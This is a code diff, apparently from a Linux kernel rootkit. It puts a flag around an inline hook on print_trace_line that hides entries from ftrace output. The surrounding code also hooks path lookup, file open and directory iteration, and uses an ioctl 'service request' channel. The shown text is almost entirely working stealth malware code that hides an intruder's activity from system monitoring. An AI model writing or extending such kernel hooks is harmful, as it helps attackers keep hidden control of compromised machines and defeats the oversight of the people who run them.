@@ -16,7 +16,9 @@ static int (*orig_walk_component)(struct nameidata *nd, int flags);
 static struct file *(*orig_path_openat)(struct nameidata *nd, const struct open_flags *op, unsigned flags);
 static struct dentry *(*orig___lookup_hash)(const struct qstr *name, struct dentry *base, unsigned int flags);
 int (*orig_iterate_dir)(struct file *file, struct dir_context *ctx);
+#ifdef HIDE_FTRACE
 enum print_line_t (*orig_print_trace_line)(struct trace_iterator *iter);
+#endif
 
 /**
  * Hook that catches ioctl requests, and checks if it's a service request.
@@ -133,6 +135,7 @@ notrace int hook_iterate_dir(struct file *file, struct dir_context *ctx)
     return res;
 }
 
+#ifdef HIDE_FTRACE
 notrace enum print_line_t hook_print_trace_line(struct trace_iterator *iter)
 {
     enum print_line_t ret;
@@ -167,6 +170,7 @@ notrace enum print_line_t hook_print_trace_line(struct trace_iterator *iter)
 
     return ret;
 }
+#endif
 
 /**
  * Hook definitions.
@@ -194,8 +198,10 @@ inline int register_hooks(void)
     if (err)
         return err;
 
+#ifdef HIDE_FTRACE
     orig_print_trace_line = (enum print_line_t (*)(struct trace_iterator *iter))kallsyms_lookup_name("print_trace_line");
     inline_hook_register((void *)orig_print_trace_line, (void *)hook_print_trace_line);
+#endif
 
     return 0;
 }
@@ -203,5 +209,7 @@ inline int register_hooks(void)
 inline void unregister_hooks(void)
 {
     ftrace_remove_hooks(hooks, ARRAY_SIZE(hooks));
+#ifdef HIDE_FTRACE
     inline_hook_unregister((void *)orig_print_trace_line);
+#endif
 }
